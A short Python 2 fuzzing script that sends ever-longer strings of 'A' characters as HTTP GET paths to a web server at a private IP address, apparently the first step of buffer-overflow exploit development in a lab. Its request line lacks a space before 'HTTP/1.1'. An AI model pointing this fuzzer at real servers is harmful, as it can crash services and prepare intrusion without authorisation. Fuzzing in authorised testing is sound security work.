import socket


buffer = ["A"]
counter = 100

while len(buffer) < 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing GET with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(("192.168.1.131", 80))
	s.send('GET ' + string + 'HTTP/1.1\r\n\r\n')
	s.recv(1024)
	s.close()
